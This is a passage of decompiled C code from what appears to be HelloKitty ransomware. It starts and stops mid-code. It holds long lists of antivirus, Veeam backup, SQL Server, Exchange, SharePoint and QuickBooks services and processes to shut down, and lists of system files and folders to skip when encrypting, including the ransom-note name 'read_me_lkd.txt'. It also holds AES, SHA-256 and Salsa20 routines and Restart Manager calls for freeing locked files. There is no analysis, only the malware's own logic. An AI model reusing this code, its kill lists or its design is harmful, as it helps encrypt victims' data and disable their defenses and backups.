  L"svcGenericHost",
  L"mcregwiz.exe",
  L"swi_filter",
  L"rssensor.exe",
  L"swi_service",
  L"safeservice.exe",
  L"swi_update_64",
  L"ncdaemon.exe",
  L"TmCCSF",
  L"mcdash.exe",
  L"tmlisten",
  L"mcdetect.exe",
  L"TrueKey",
  L"ssscheduler.exe",
  L"TrueKeyScheduler",
  L"sahookmain.exe",
  L"TrueKeyServiceHelper",
  L"mskdetct.exe",
  L"UI0Detect",
  L"msksrvr.exe",
  L"VeeamBackupSvc",
  L"mskagent.exe",
  L"VeeamBrokerSvc",
  L"stinger.exe",
  L"VeeamCatalogSvc",
  L"mcsysmon.exe",
  L"VeeamCloudSvc",
  L"mctskshd.exe",
  L"VeeamDeploymentService",
  L"mfetp.exe",
  L"VeeamDeploySvc",
  L"myagttry.exe",
  L"VeeamEnterpriseManagerSvc",
  L"mcupdmgr.exe",
  L"VeeamMountSvc",
  L"rulaunch.exe",
  L"VeeamNFSSvc",
  L"mcvsshld.exe",
  L"VeeamRESTSvc",
  L"tbmon.exe",
  L"VeeamTransportSvc",
  L"alogserv.exe",
  L"W3Svc",
  L"mcmnhdlr.exe",
  L"WRSVC",
  L"mghtml.exe",
  L"VeeamHvIntegrationSvc",
  L"edisk.exe",
  L"swi_update",
  L"scan32.exe",
  L"SQLAgent$CXDB",
  L"frameworkservice.exe",
  L"McAfee SiteAdvisor Enterprise Service",
  L"mcconsol.exe",
  L"MSSQL$CITRIX_METAFRAME",
  L"mcscript_inuse.exe",
  &off_420360,
  L"mctray.exe",
  &off_420310,
  L"mcupdate.exe",
  &off_4202E0,
  L"shstat.exe",
  &off_4202B0,
  L"udaterui.exe",
  &off_420274,
  L"updaterui.exe",
  &off_420228,
  L"mcepoc.exe",
  &off_4201E0,
  L"mcepocfg.exe",
  &off_4201A4,
  L"mcpalmcfg.exe",
  &off_42015C,
  L"mcwcecfg.exe",
  &off_420134,
  L"mcwce.exe",
  L"Alerter",
  L"frameworkservic.exe",
  L"ERSvc",
  L"vsmain.exe",
  L"Eventlog",
  L"oasclnt.exe",
  L"ImapiService",
  L"vsstat.exe",
  L"NetDDE",
  L"mcvsftsn.exe",
  L"NtLmSsp",
  L"avconsol.exe",
  L"NtmsSvc",
  L"avsynmgr.exe",
  L"odserv",
  L"vstskmgr.exe",
  L"ose",
  L"webscanx.exe",
  L"SnowInventoryClient",
  L"mfewc.exe",
  L"TlntSvr",
  L"mfewch.exe",
  L"TSM",
  L"giantantispywaremain.exe",
  L"VMTools",
  L"giantantispywareupdater.exe",
  L"VMware",
  L"gcasservalert.exe",
  L"WebClient",
  L"gcascleaner.exe",
  L"WinVNC4",
  L"gcasinstallhelper.exe",
  L"BlueStripeCollector",
  L"gcasnotice.exe",
  L"Cissesrv",
  L"gcasdtserv.exe",
  L"CpqRcmc3",
  L"gcasserv.exe",
  L"gupdate",
  L"gcasswupdater.exe",
  L"gupdatem",
  L"fcsms.exe",
  L"HealthService",
  L"fcssas.exe",
  L"NimbusWatcherService",
  L"nissrv.exe",
  L"ProLiantMonitor",
  L"dpmra.exe",
  L"SDD_Service",
  L"msseces.exe",
  L"sysdown",
  L"wscntfy.exe",
  L"System",
  L"securitymanager.exe",
  L"GoogleChromeElevationService",
  L"aesecurityservice.exe",
  L"bcrservice",
  L"deteqt.agent.exe",
  L"ccEvtMgr",
  L"omniagent.exe",
  L"ccSetMgr",
  L"nerosvc.exe",
  L"CSAdmin",
  L"seanalyzertool.exe",
  L"CSAuth",
  L"spyemergency.exe",
  L"CSDbSync",
  L"spyemergencysrv.exe",
  L"CSLog",
  L"nlclient.exe",
  L"CSMon",
  L"crdm.exe",
  L"CSRadius",
  L"nmagent.exe",
  L"CSTacacs",
  L"ehttpsrv.exe",
  L"Symantec",
  L"nod32.exe",
  L"VGAuthService",
  L"nod32krn.exe",
  L"SepMasterServiceMig",
  L"nod32kui.exe",
  L"vmware-converter-agent",
  L"nod32view.exe",
  L"vmware-converter-server",
  L"cclaw.exe",
  L"vmware-converter-worker",
  L"elogsvc.exe",
  L"avbackup",
  L"nip.exe",
  L"MSSQL$NET2",
  L"nipsvc.exe",
  L"Net2ClientSvc",
  L"njeeves.exe",
  L"NetSvc",
  L"npfmsg2.exe",
  L"SQLAgent$NET2",
  L"npfmsg.exe",
  L"tpautoconnsvc",
  L"npfsvice.exe",
  L"TPVCGateway",
  L"nrmenctb.exe",
  L"VMwareCAFCommAmqpListener",
  L"nvcoas.exe",
  L"VMwareCAFManagementAgentHost",
  L"nvcsched.exe",
  L"TPAutoConnSvc",
  L"nymse.exe",
  L"AdobeARMservice",
  L"zanda.exe",
  L"RSCDsvc",
  L"zlh.exe",
  L"LRSDRVX",
  L"ixaptsvc.exe",
  L"msvsmon90",
  L"ixavsvc.exe",
  L"IDriverT",
  L"ixfwsvc.exe",
  L"MSMQ",
  L"emlproui.exe",
  L"Alerter",
  L"emlproxy.exe",
  L"ERSvc",
  L"mpsvc.exe",
  L"Eventlog",
  L"onlinent.exe",
  L"ImapiService",
  L"onlnsvc.exe",
  L"NetDDE",
  L"scanmsg.exe",
  L"NtLmSsp",
  L"scanwscs.exe",
  L"NtmsSvc",
  L"tsansrf.exe",
  L"odserv",
  L"tsatisy.exe",
  L"ose",
  L"tscutynt.exe",
  L"SnowInventoryClient",
  L"tsmpnt.exe",
  L"TlntSvr",
  L"upschd.exe",
  L"TSM",
  L"xfilter.exe",
  L"VMTools",
  L"aps.exe",
  L"VMware",
  L"aus.exe",
  L"WebClient",
  L"outpost.exe",
  L"WinVNC4",
  L"adminserver.exe",
  L"BlueStripeCollector",
  L"avtask.exe",
  L"Cissesrv",
  L"clshield.exe",
  L"CpqRcmc3",
  L"console.exe",
  L"gupdate",
  L"cpntsrv.exe",
  L"gupdatem",
  L"padfsvr.exe",
  L"HealthService",
  L"pasystemtray.exe",
  L"NimbusWatcherService",
  L"pavfnsvr.exe",
  L"ProLiantMonitor",
  L"pavkre.exe",
  L"SDD_Service",
  L"pavprot.exe",
  L"sysdown",
  L"pavreport.exe",
  L"System",
  L"pnmsrv.exe",
  L"GoogleChromeElevationService",
  L"psimsvc.exe",
  L"bcrservice",
  L"pavupg.exe",
  L"ccEvtMgr",
  L"remupd.exe",
  L"ccSetMgr",
  L"iface.exe",
  L"CSAdmin",
  L"pavfires.exe",
  L"CSAuth",
  L"pavmail.exe",
  L"CSDbSync",
  L"pavprsrv.exe",
  L"CSLog",
  L"pavsched.exe",
  L"CSMon",
  L"pavsrv50.exe",
  L"CSRadius",
  L"pavsrv51.exe",
  L"CSTacacs",
  L"pavsrv52.exe",
  L"Symantec",
  L"prevsrv.exe",
  L"VGAuthService",
  L"tpsrv.exe",
  L"SepMasterServiceMig",
  L"pagent.exe",
  L"vmware-converter-agent",
  L"pagentwd.exe",
  L"vmware-converter-server",
  L"psctris.exe",
  L"vmware-converter-worker",
  L"apvxdwin.exe",
  L"avbackup",
  L"inicio.exe",
  L"MSSQL$NET2",
  L"pavbckpt.exe",
  L"Net2ClientSvc",
  L"pavjobs.exe",
  L"NetSvc",
  L"psctrls.exe",
  L"SQLAgent$NET2",
  L"pshost.exe",
  L"tpautoconnsvc",
  L"psimreal.exe",
  L"TPVCGateway",
  L"pskmssvc.exe",
  L"VMwareCAFCommAmqpListener",
  L"srvload.exe",
  L"VMwareCAFManagementAgentHost",
  L"webproxy.exe",
  L"TPAutoConnSvc",
  L"avltmain.exe",
  L"AdobeARMservice",
  L"firewallgui.exe",
  L"RSCDsvc",
  L"pviewer.exe",
  L"LRSDRVX",
  L"pview.exe",
  L"msvsmon90",
  L"pmon.exe",
  L"IDriverT",
  L"qoeloader.exe",
  L"MSMQ",
  L"fws.exe",
  L"HelloKittyMutex"
}; // weak
wchar_t *off_418F98[77] =
{
  L"mysql*",
  L"dsa*",
  L"Ntrtscan*",
  L"ds_monitor*",
  L"Notifier*",
  L"TmListen*",
  L"iVPAgent*",
  L"CNTAoSMgr*",
  &off_422FEC,
  L"bes10*",
  L"black*",
  L"robo*",
  L"copy*",
  L"store.exe",
  L"sql*",
  L"vee*",
  L"wrsa*",
  L"wrsa.exe",
  L"postg*",
  L"sage*",
  L"MSSQLServerADHelper100",
  L"MSSQL$ISARS",
  L"MSSQL$MSFW",
  L"SQLAgent$ISARS",
  L"SQLAgent$MSFW",
  L"SQLBrowser",
  L"ReportServer$ISARS",
  L"SQLWriter",
  L"WinDefend",
  L"mr2kserv",
  L"MSExchangeADTopology",
  L"MSExchangeFBA",
  L"MSExchangeIS",
  L"MSExchangeSA",
  L"ShadowProtectSvc",
  L"SPAdminV4",
  L"SPTimerV4",
  L"SPTraceV4",
  L"SPUserCodeV4",
  L"SPWriterV4",
  L"SPSearch4",
  L"MSSQLServerADHelper100",
  L"IISADMIN",
  L"firebirdguardiandefaultinstance",
  L"ibmiasrw",
  &off_423284,
  &off_4232AC,
  &off_4232B8,
  L"\"IBM Domino Server(CProgramFilesIBMDominodata)\"",
  L"\"IBM Domino Diagnostics(CProgramFilesIBMDomino)\"",
  L"IISADMIN",
  L"\"Simply Accounting Database Connection Manager\"",
  L"QuickBooksDB1",
  L"QuickBooksDB2",
  L"QuickBooksDB3",
  L"QuickBooksDB4",
  L"QuickBooksDB5",
  L"QuickBooksDB6",
  L"QuickBooksDB7",
  L"QuickBooksDB8",
  L"QuickBooksDB9",
  L"QuickBooksDB10",
  L"QuickBooksDB11",
  L"QuickBooksDB12",
  L"QuickBooksDB13",
  L"QuickBooksDB14",
  L"QuickBooksDB15",
  L"QuickBooksDB16",
  L"QuickBooksDB17",
  L"QuickBooksDB18",
  L"QuickBooksDB19",
  L"QuickBooksDB20",
  L"QuickBooksDB21",
  L"QuickBooksDB22",
  L"QuickBooksDB23",
  L"QuickBooksDB24",
  L"QuickBooksDB25"
}; // weak
wchar_t *off_418FE8[57] =
{
  L"MSSQLServerADHelper100",
  L"MSSQL$ISARS",
  L"MSSQL$MSFW",
  L"SQLAgent$ISARS",
  L"SQLAgent$MSFW",
  L"SQLBrowser",
  L"ReportServer$ISARS",
  L"SQLWriter",
  L"WinDefend",
  L"mr2kserv",
  L"MSExchangeADTopology",
  L"MSExchangeFBA",
  L"MSExchangeIS",
  L"MSExchangeSA",
  L"ShadowProtectSvc",
  L"SPAdminV4",
  L"SPTimerV4",
  L"SPTraceV4",
  L"SPUserCodeV4",
  L"SPWriterV4",
  L"SPSearch4",
  L"MSSQLServerADHelper100",
  L"IISADMIN",
  L"firebirdguardiandefaultinstance",
  L"ibmiasrw",
  &off_423284,
  &off_4232AC,
  &off_4232B8,
  L"\"IBM Domino Server(CProgramFilesIBMDominodata)\"",
  L"\"IBM Domino Diagnostics(CProgramFilesIBMDomino)\"",
  L"IISADMIN",
  L"\"Simply Accounting Database Connection Manager\"",
  L"QuickBooksDB1",
  L"QuickBooksDB2",
  L"QuickBooksDB3",
  L"QuickBooksDB4",
  L"QuickBooksDB5",
  L"QuickBooksDB6",
  L"QuickBooksDB7",
  L"QuickBooksDB8",
  L"QuickBooksDB9",
  L"QuickBooksDB10",
  L"QuickBooksDB11",
  L"QuickBooksDB12",
  L"QuickBooksDB13",
  L"QuickBooksDB14",
  L"QuickBooksDB15",
  L"QuickBooksDB16",
  L"QuickBooksDB17",
  L"QuickBooksDB18",
  L"QuickBooksDB19",
  L"QuickBooksDB20",
  L"QuickBooksDB21",
  L"QuickBooksDB22",
  L"QuickBooksDB23",
  L"QuickBooksDB24",
  L"QuickBooksDB25"
}; // weak
const _ThrowInfo _TI2_AVbad_alloc_std__ = { 0u, &unknown_libname_3, NULL, &_CTA2_AVbad_alloc_std__ }; // idb
const _ThrowInfo _TI3_AVbad_array_new_length_std__ = { 0u, &unknown_libname_3, NULL, &_CTA3_AVbad_array_new_length_std__ }; // idb
const _ThrowInfo _TI3_AVlength_error_std__ = { 0u, &unknown_libname_3, NULL, &_CTA3_AVlength_error_std__ }; // idb
int dword_426020 = 1; // weak
wchar_t *off_426118 = L"         (((((                  H"; // weak
void *Block = &unk_4264D8; // idb
int dword_426758 = -2; // weak
wchar_t *off_426780[26] =
{
  L"read_me_lkd.txt",
  L"ntldr",
  L"pagefile.sys",
  L"ntdetect.com",
  L"autoexec.bat",
  L"desktop.ini",
  L"autorun.inf",
  L"ntuser.dat",
  L"iconcache.db",
  L"bootsect.bak",
  L"boot.ini",
  L"bootfont.bin",
  L"config.sys",
  L"io.sys",
  L"msdos.sys",
  L"ntuser.dat.log",
  L"thumbs.db",
  L"programdata",
  L"$recycle.bin",
  L"program files",
  L"windows",
  L"all users",
  L"winnt",
  L"appdata",
  L"application data",
  L"local settings"
}; // weak
wchar_t *off_4267C4[9] =
{
  L"programdata",
  L"$recycle.bin",
  L"program files",
  L"windows",
  L"all users",
  L"winnt",
  L"appdata",
  L"application data",
  L"local settings"
}; // weak
char byte_4267E8[256] =
{
  '\xDF',
  '`',
  '\xAD',
  '\xBB',
  ')',
  'W',
  'A',
  '\xD3',
  '\xAB',
  '\xCE',
  'h',
  '\x1F',
  '\x83',
  'n',
  '\x99',
  'o',
  '!',
  'I',
  '\xDB',
  'E',
  '\xD3',
  '\xC2',
  '\xCB',
  '\xDE',
  '\x8E',
  'x',
  '\xF1',
  '\xF7',
  '\xA7',
  '\x95',
  '\x18',
  '\xDF',
  'O',
  '\xA5',
  '/',
  '\xBC',
  '\x82',
  '\x11',
  '@',
  '\r',
  'J',
  '\xEC',
  'y',
  '\xA3',
  '\x10',
  '\xD3',
  '\xEE',
  '\x1E',
  '\x94',
  '\xD3',
  '\v',
  '\xD7',
  ')',
  'D',
  '=',
  '\x92',
  '\x1C',
  '0',
  '\x91',
  '\x97',
  's',
  '\xA9',
  '\xCE',
  '\x14',
  '$',
  '\xA9',
  '\xD9',
  'q',
  '?',
  '\x89',
  '\xE2',
  '\b',
  '%',
  '\xC1',
  '\x10',
  'S',
  '\x99',
  '\xDD',
  '\xD0',
  '\'',
  'H',
  '\xBA',
  'T',
  '\\',
  '\xE9',
  'o',
  '\x7F',
  '\x9C',
  '=',
  'c',
  '$',
  '\xD4',
  '\xD8',
  '\xC5',
  '\x85',
  '\x96',
  'y',
  '\xA8',
  '\xF0',
  '\xC0',
  '-',
  '-',
  '\xC9',
  'M',
  '\x16',
  '\xFE',
  '\xF1',
  '\'',
  '\xD3',
  '\x95',
  '\x16',
  '\x96',
  '\xF2',
  '\n',
  '\x1F',
  'G',
  ',',
  'p',
  '\x18',
  '\xE0',
  'M',
  '\xFF',
  '\xCD',
  '+',
  'L',
  '\x8A',
  '\xC4',
  '\xED',
  'q',
  '5',
  '\xB0',
  '\n',
  '\x82',
  '2',
  '.',
  'F',
  '7',
  '\xC9',
  '\f',
  '\x9E',
  '\xA8',
  '<',
  'y',
  '\x1A',
  '\xA5',
  '\xE2',
  'F',
  '?',
  't',
  '\x89',
  '\xAA',
  '}',
  'h',
  '\xF8',
  'y',
  '\xE5',
  '\xA1',
  '\x96',
  '\t',
  '+',
  '\x04',
  '\x9F',
  '\x8D',
  'O',
  ')',
  'B',
  'I',
  '\xB9',
  '\xCB',
  '\xE2',
  'y',
  '\xBD',
  'E',
  '}',
  '\x01',
  '\xCE',
  'q',
  '5',
  '$',
  ':',
  '\x1A',
  'M',
  '\xF6',
  '\xC9',
  '\xCF',
  ';',
  '\xB9',
  '\xF9',
  '\x15',
  '\xAD',
  'U',
  '\xCE',
  '\x19',
  '\xD7',
  '\xFC',
  '/',
  '\x86',
  '(',
  '\xF1',
  'b',
  '\x91',
  ':',
  '\xBC',
  '\xA0',
  '\x86',
  '\t',
  '_',
  '\xB5',
  'k',
  '+',
  'H',
  '\x86',
  'L',
  'p',
  '\xCD',
  '\xC8',
  '\x9B',
  '\x9A',
  '\x89',
  '\x87',
  '\xA3',
  '\xFA',
  '\xCF',
  '|',
  '\xC7',
  '\xBD',
  '\x17',
  '\x18',
  '\xDD',
  '\x8E',
  '.',
  '\xE1',
  '\xAB',
  ':',
  '\x93',
  '\xFD',
  '2',
  '\xB1',
  '\xA6',
  '4',
  '\xAA',
  'F',
  '\xEF',
  '\xA8',
  '\xF4',
  'T',
  '\x8E',
  'N',
  '\xFB',
  '@',
  '{',
  '\x15',
  's',
  '\xE2',
  '\xF8',
  '\''
}; // weak
LPCVOID lpBuffer = NULL; // idb
__int64 qword_4268F8 = 30064771072i64; // weak
char salsa20_426900 = 'e'; // weak
char byte_426901 = 'x'; // weak
char byte_426902 = 'p'; // weak
char byte_426903 = 'a'; // weak
char byte_426904 = 'n'; // weak
char byte_426905 = 'd'; // weak
char byte_426906 = ' '; // weak
char byte_426907 = '3'; // weak
char byte_426908 = '2'; // weak
char byte_426909 = '-'; // weak
char byte_42690A = 'b'; // weak
char byte_42690B = 'y'; // weak
char byte_42690C = 't'; // weak
char byte_42690D = 'e'; // weak
char byte_42690E = ' '; // weak
char byte_42690F = 'k'; // weak
int dword_426A48; // weak
union _SLIST_HEADER ListHead; // idb
_UNKNOWN unk_426A60; // weak
int dword_426E38; // weak
void *dword_426F50; // idb
void *dword_426F54; // idb
_onexit_table_t stru_426F58; // idb
int dword_426F70; // weak
int dword_426F7C; // weak
int dword_426F80; // weak
_UNKNOWN unk_426F84; // weak
struct __crt_locale_data *dword_426F98; // idb
int dword_426FA0[124]; // weak
int dword_4271A0; // weak
HANDLE hHeap; // idb
int dword_42741C; // weak
LONG dword_427424; // idb
LONG Addend; // idb
LONG dword_42742C; // idb
LONG dword_427430; // idb
int dword_427434; // weak
int dword_427438; // weak
int dword_42743C; // weak
DWORD (__stdcall *RmGetList)(DWORD dwSessionHandle, UINT *pnProcInfoNeeded, UINT *pnProcInfo, RM_PROCESS_INFO rgAffectedApps[], LPDWORD lpdwRebootReasons);
int dword_427444; // weak
DWORD (__stdcall *RmStartSession)(DWORD *pSessionHandle, DWORD dwSessionFlags, WCHAR strSessionKey[]);
int dword_42744C; // weak
HMODULE hModule; // idb
DWORD (__stdcall *RmShutdown)(DWORD dwSessionHandle, ULONG lActionFlags, RM_WRITE_STATUS_CALLBACK fnStatus);
DWORD (__stdcall *RmEndSession)(DWORD dwSessionHandle);
DWORD (__stdcall *RmRegisterResources)(DWORD dwSessionHandle, UINT nFiles, LPCWSTR rgsFileNames[], UINT nApplications, RM_UNIQUE_PROCESS rgApplications[], UINT nServices, LPCWSTR rgsServiceNames[]);
int dword_427460; // weak
_UNKNOWN unk_427468; // weak
_UNKNOWN unk_427470; // weak
_UNKNOWN unk_427474; // weak
int dword_427480; // weak


//----- (00401000) --------------------------------------------------------
int sub_401000()
{
  return atexit(sub_411F70);
}

//----- (00401010) --------------------------------------------------------
unsigned __int8 *__fastcall sub_401010(_BYTE *a1, _BYTE *a2)
{
  unsigned __int8 *result; // eax
  unsigned int v3; // esi
  unsigned __int8 v4; // dh
  unsigned __int8 v5; // bl
  unsigned __int8 v6; // bh
  int v7; // edx
  char v8; // [esp+Eh] [ebp-2h]
  unsigned __int8 v9; // [esp+Fh] [ebp-1h]

  *a1 = *a2;
  a1[1] = a2[1];
  a1[2] = a2[2];
  a1[3] = a2[3];
  a1[4] = a2[4];
  a1[5] = a2[5];
  a1[6] = a2[6];
  a1[7] = a2[7];
  a1[8] = a2[8];
  a1[9] = a2[9];
  a1[10] = a2[10];
  a1[11] = a2[11];
  a1[12] = a2[12];
  a1[13] = a2[13];
  a1[14] = a2[14];
  a1[15] = a2[15];
  a1[16] = a2[16];
  a1[17] = a2[17];
  a1[18] = a2[18];
  a1[19] = a2[19];
  a1[20] = a2[20];
  a1[21] = a2[21];
  a1[22] = a2[22];
  a1[23] = a2[23];
  a1[24] = a2[24];
  a1[25] = a2[25];
  a1[26] = a2[26];
  a1[27] = a2[27];
  a1[28] = a2[28];
  result = a1 + 29;
  a1[29] = a2[29];
  a1[30] = a2[30];
  a1[31] = a2[31];
  v3 = 8;
  do
  {
    v4 = result[2];
    v5 = *(result - 1);
    v6 = *result;
    v9 = result[1];
    if ( (v3 & 7) != 0 )
    {
      if ( (v3 & 7) == 4 )
      {
        v5 = RijnDael_AES_LONG_416E18[v5];
        v6 = RijnDael_AES_LONG_416E18[v6];
        v9 = RijnDael_AES_LONG_416E18[v9];
        v4 = RijnDael_AES_LONG_416E18[v4];
      }
    }
    else
    {
      v7 = v6;
      v6 = RijnDael_AES_LONG_416E18[result[1]];
      v9 = RijnDael_AES_LONG_416E18[result[2]];
      v8 = RijnDael_AES_LONG_416E18[v5];
      v5 = RijnDael_AES_LONG_416E18[v7] ^ byte_417018[v3 >> 3];
      v4 = v8;
    }
    ++v3;
    result[3] = v5 ^ *(result - 29);
    result[4] = v6 ^ *(result - 28);
    result[5] = v9 ^ *(result - 27);
    result[6] = v4 ^ *(result - 26);
    result += 4;
  }
  while ( v3 < 0x3C );
  return result;
}

//----- (004011C0) --------------------------------------------------------
int __fastcall sub_4011C0(unsigned __int8 *a1, int a2)
{
  int v2; // ebx
  unsigned __int8 *v3; // edi
  int v4; // esi
  int v5; // edx
  unsigned __int8 *v6; // ebx
  unsigned __int8 *v7; // ecx
  int v8; // edx
  int v9; // eax
  int v10; // esi
  unsigned __int8 v11; // cl
  unsigned __int8 v12; // al
  unsigned __int8 v13; // cl
  unsigned __int8 v14; // al
  unsigned __int8 v15; // cl
  unsigned __int8 v16; // al
  unsigned __int8 v17; // cl
  _BYTE *v18; // edi
  char v19; // bh
  char v20; // ch
  char v21; // dl
  char v22; // dh
  int v23; // ebx
  char *v24; // esi
  unsigned __int8 *v25; // eax
  int v26; // edx
  char v27; // cl
  unsigned __int8 *v28; // esi
  int v29; // ebx
  unsigned __int8 *v30; // ecx
  int v31; // edx
  int v32; // eax
  unsigned __int8 v33; // cl
  int v34; // esi
  unsigned __int8 v35; // al
  unsigned __int8 v36; // cl
  unsigned __int8 v37; // al
  unsigned __int8 v38; // cl
  unsigned __int8 v39; // al
  unsigned __int8 v40; // cl
  int result; // eax
  _BYTE *v42; // ecx
  int v43; // edx
  unsigned __int8 *v44; // [esp+Ch] [ebp-18h]
  int v46; // [esp+14h] [ebp-10h]
  char *v47; // [esp+18h] [ebp-Ch]
  int v48; // [esp+1Ch] [ebp-8h]
  char v49; // [esp+23h] [ebp-1h]

  v2 = 4;
  v3 = a1;
  v44 = a1;
  v4 = a2 - (_DWORD)a1;
  do
  {
    v5 = 4;
    do
    {
      *a1 ^= a1[v4];
      ++a1;
      --v5;
    }
    while ( v5 );
    --v2;
  }
  while ( v2 );
  v46 = 13;
  v47 = (char *)(a2 + 16);
  do
  {
    v6 = v3;
    v48 = 4;
    do
    {
      v7 = v6;
      v8 = 4;
      do
      {
        v9 = *v7;
        v7 += 4;
        *(v7 - 4) = RijnDael_AES_LONG_416E18[v9];
        --v8;
      }
      while ( v8 );
      ++v6;
      --v48;
    }
    while ( v48 );
    v10 = 4;
    v11 = v3[1];
    v3[1] = v3[5];
    v3[5] = v3[9];
    v3[9] = v3[13];
    v12 = v3[10];
    v3[13] = v11;
    v13 = v3[2];
    v3[2] = v12;
    v14 = v3[14];
    v3[10] = v13;
    v15 = v3[6];
    v3[6] = v14;
    v16 = v3[15];
    v3[14] = v15;
    v17 = v3[3];
    v3[3] = v16;
    v3[15] = v3[11];
    v3[11] = v3[7];
    v3[7] = v17;
    v18 = v3 + 2;
    do
    {
      v19 = v18[1];
      v18 += 4;
      v20 = *(v18 - 4);
      v21 = *(v18 - 5);
      v49 = *(v18 - 6);
      v22 = v21 ^ v49 ^ v20 ^ v19;
      *(v18 - 6) = v22 ^ v49 ^ (2 * (v21 ^ v49)) ^ (27 * ((unsigned __int8)(v21 ^ v49) >> 7));
      *(v18 - 5) = v22 ^ v21 ^ (2 * (v20 ^ v21)) ^ (27 * ((unsigned __int8)(v20 ^ v21) >> 7));
      *(v18 - 4) = v22 ^ v20 ^ (2 * (v20 ^ v19)) ^ (27 * ((unsigned __int8)(v20 ^ v19) >> 7));
      *(v18 - 3) = v22 ^ v19 ^ (2 * (v19 ^ v49)) ^ (27 * ((unsigned __int8)(v19 ^ v49) >> 7));
      --v10;
    }
    while ( v10 );
    v3 = v44;
    v23 = 4;
    v24 = v47;
    v25 = v44;
    do
    {
      v26 = 4;
      do
      {
        v27 = *v24++;
        *v25++ ^= v27;
        --v26;
      }
      while ( v26 );
      v47 = v24;
      --v23;
    }
    while ( v23 );
    --v46;
  }
  while ( v46 );
  v28 = v44;
  v29 = 4;
  do
  {
    v30 = v28;
    v31 = 4;
    do
    {
      v32 = *v30;
      v30 += 4;
      *(v30 - 4) = RijnDael_AES_LONG_416E18[v32];
      --v31;
    }
    while ( v31 );
    ++v28;
    --v29;
  }
  while ( v29 );
  v33 = v44[1];
  v34 = 4;
  v44[1] = v44[5];
  v44[5] = v44[9];
  v44[9] = v44[13];
  v35 = v44[10];
  v44[13] = v33;
  v36 = v44[2];
  v44[2] = v35;
  v37 = v44[14];
  v44[10] = v36;
  v38 = v44[6];
  v44[6] = v37;
  v39 = v44[15];
  v44[14] = v38;
  v40 = v44[3];
  v44[3] = v39;
  v44[15] = v44[11];
  result = v44[7];
  v44[7] = v40;
  v44[11] = result;
  v42 = (_BYTE *)(a2 + 224);
  do
  {
    v43 = 4;
    do
    {
      LOBYTE(result) = *v42++;
      *v3++ ^= result;
      --v43;
    }
    while ( v43 );
    --v34;
  }
  while ( v34 );
  return result;
}

//----- (00401410) --------------------------------------------------------
int __fastcall sub_401410(int a1, int a2)
{
  _DWORD *v2; // ebx
  int v3; // esi
  unsigned int i; // edi
  int v5; // edx
  _DWORD *v6; // eax
  unsigned int v7; // ebx
  unsigned int v8; // edx
  unsigned int v9; // edx
  int v10; // edi
  int v11; // eax
  int v12; // ebx
  int v13; // esi
  int v14; // eax
  int v15; // ecx
  int v16; // eax
  _DWORD *v17; // ebx
  int result; // eax
  _DWORD v19[66]; // [esp+4h] [ebp-130h] BYREF
  int v20; // [esp+10Ch] [ebp-28h]
  _DWORD *v21; // [esp+110h] [ebp-24h]
  unsigned int v22; // [esp+114h] [ebp-20h]
  int v23; // [esp+118h] [ebp-1Ch]
  int v24; // [esp+11Ch] [ebp-18h]
  int v25; // [esp+120h] [ebp-14h]
  int v26; // [esp+124h] [ebp-10h]
  int v27; // [esp+128h] [ebp-Ch]
  int v28; // [esp+12Ch] [ebp-8h]
  int v29; // [esp+130h] [ebp-4h]

  v2 = (_DWORD *)a1;
  v3 = a2 + 1;
  v21 = (_DWORD *)a1;
  for ( i = 0; i < 0x10; ++i )
  {
    v5 = *(unsigned __int8 *)(v3 - 1);
    v3 += 4;
    v19[i + 2] = *(unsigned __int8 *)(v3 - 2) | ((*(unsigned __int8 *)(v3 - 3) | ((*(unsigned __int8 *)(v3 - 4) | (v5 << 8)) << 8)) << 8);
  }
  if ( i < 0x40 )
  {
    v6 = &v19[i];
    v7 = 64 - i;
    do
    {
      v8 = *(v6 - 13);
      ++v6;
      v6[1] = *(v6 - 6)
            + *(v6 - 15)
            + ((*(v6 - 1) >> 10) ^ __ROL4__(*(v6 - 1), 13) ^ __ROL4__(*(v6 - 1), 15))
            + ((v8 >> 3) ^ __ROR4__(v8, 7) ^ __ROL4__(v8, 14));
      --v7;
    }
    while ( v7 );
    v2 = v21;
  }
  v9 = 0;
  v20 = v2[20];
  v10 = v20;
  v26 = v2[21];
  v29 = v2[22];
  v25 = v2[23];
  v24 = v2[24];
  v28 = v2[25];
  v27 = v2[26];
  v11 = v2[27];
  v12 = v24;
  v23 = v11;
  v22 = 0;
  do
  {
    v13 = v23
        + *(_DWORD *)((char *)&v19[2] + v9)
        + *(int *)((char *)&dword_417428 + v9)
        + (v12 & v28 ^ v27 & ~v12)
        + (__ROR4__(v12, 6) ^ __ROL4__(v12, 7) ^ __ROR4__(v12, 11));
    v23 = v27;
    v14 = v28;
    v15 = v10;
    v28 = v12;
    v10 = (v10 & v26 ^ v29 & (v10 ^ v26)) + (__ROR4__(v10, 2) ^ __ROL4__(v10, 10) ^ __ROR4__(v10, 13)) + v13;
    v27 = v14;
    v12 = v13 + v25;
    v9 = v22 + 4;
    v25 = v29;
    v29 = v26;
    v26 = v15;
    v22 = v9;
  }
  while ( v9 < 0x100 );
  v16 = v10 + v20;
  v24 = v12;
  v17 = v21;
  v21[21] += v15;
  v17[20] = v16;
  v17[22] += v29;
  v17[23] += v25;
  v17[24] += v24;
  v17[25] += v28;
  v17[26] += v27;
  result = v23;
  v17[27] += v23;
  return result;
}
// 417428: using guessed type int dword_417428;

//----- (004015C0) --------------------------------------------------------
int __fastcall sub_4015C0(_DWORD *a1, _BYTE *a2)
{
  unsigned int v3; // eax
  unsigned int v4; // edi
  int v5; // eax
  bool v6; // cf
  int v7; // ecx
  int v8; // ebx
  int v9; // edx
  int v10; // ecx
  int v11; // esi
  int result; // eax
  int v13; // [esp+10h] [ebp-Ch]

  v3 = a1[16];
  *((_BYTE *)a1 + v3) = 0x80;
  v4 = v3 + 1;
  if ( v3 >= 0x38 )
  {
    if ( v4 < 0x40 )
      memset((char *)a1 + v4, 0, 64 - v4);
    sub_401410((int)a1, (int)a1);
    memset(a1, 0, 0x38u);
  }
  else if ( v4 < 0x38 )
  {
    memset((char *)a1 + v4, 0, 56 - v4);
  }
  v5 = 8 * a1[16];
  v6 = __CFADD__(v5, a1[18]);
  a1[18] += v5;
  v7 = a1[18];
  a1[19] += v6;
  *((_BYTE *)a1 + 63) = v7;
  *((_BYTE *)a1 + 62) = *((_BYTE *)a1 + 73);
  *((_BYTE *)a1 + 61) = *((_BYTE *)a1 + 74);
  *((_BYTE *)a1 + 60) = *((_BYTE *)a1 + 75);
  *((_BYTE *)a1 + 59) = *((_BYTE *)a1 + 76);
  *((_BYTE *)a1 + 58) = *((_BYTE *)a1 + 77);
  *((_BYTE *)a1 + 57) = *((_BYTE *)a1 + 78);
